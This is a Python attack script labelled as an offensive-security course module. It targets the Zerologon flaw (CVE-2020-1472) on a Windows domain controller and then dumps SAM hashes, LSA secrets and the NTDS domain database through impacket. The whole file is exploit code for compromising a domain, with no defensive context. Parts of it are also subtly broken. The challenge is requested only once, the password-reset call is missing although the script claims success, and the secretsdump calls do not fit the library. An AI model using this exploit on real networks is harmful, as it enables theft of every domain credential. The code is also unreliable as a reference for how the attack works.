# -----------------------------------------------------------------------------------|
#                                                                                    |
# MODULE 4: LATERAL MOVEMENT & PRIVILEGE ESCALATION                                  |
# Zero-Logon Exploitation                                                            |
#                                                                                    |
# -----------------------------------------------------------------------------------|


# zerologon_exploit.py - Domain controller compromise
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
import time

def exploit_zerologon(dc_ip, dc_name):
    """Exploit CVE-2020-1472 to reset DC machine account password"""
    
    # Create connection to DC
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    
    # Use authentication bypass
    server_creds = nrpc.NetrServerReqChallenge()
    server_creds['PrimaryName'] = dc_name + '\x00'
    server_creds['ComputerName'] = dc_name + '\x00'
    server_creds['ClientChallenge'] = b'\x00' * 8
    
    resp = rpc_con.request(server_creds)
    
    # Send 256 attempts (statistical attack)
    for i in range(256):
        try:
            auth2 = nrpc.NetrServerAuthenticate3()
            auth2['PrimaryName'] = dc_name + '\x00'
            auth2['AccountName'] = dc_name + '$' + '\x00'
            auth2['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
            auth2['ComputerName'] = dc_name + '\x00'
            auth2['ClientCredential'] = b'\x00' * 8
            auth2['Flags'] = 0x212fffff
            
            rpc_con.request(auth2)
            
            # If we get here, password was reset to empty
            print(f"[+] Success! DC {dc_name} password reset on attempt {i}")
            
            # Now we can DCSync and extract all domain hashes
            dump_domain_hashes(dc_ip, dc_name)
            
            return True
            
        except nrpc.DCERPCSessionError as e:
            continue
    
    return False

def dump_domain_hashes(dc_ip, dc_name):
    """Use secretsdump with empty machine password"""
    from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
    
    # Create remote ops with empty password
    remote_ops = RemoteOperations(dc_ip, dc_name, '', '')
    remote_ops.setExecMethod('smbexec')
    
    # Dump SAM
    sam_hashes = SAMHashes(remote_ops.getBootKey(), remote_ops, isRemote=True)
    sam_hashes.dump()
    
    # Dump LSA secrets
    lsa_secrets = LSASecrets(remote_ops.getLSASecret(), remote_ops, isRemote=True)
    lsa_secrets.dump()
    
    # Dump NTDS.dit (all domain user hashes)
    remote_ops.getNTDS()
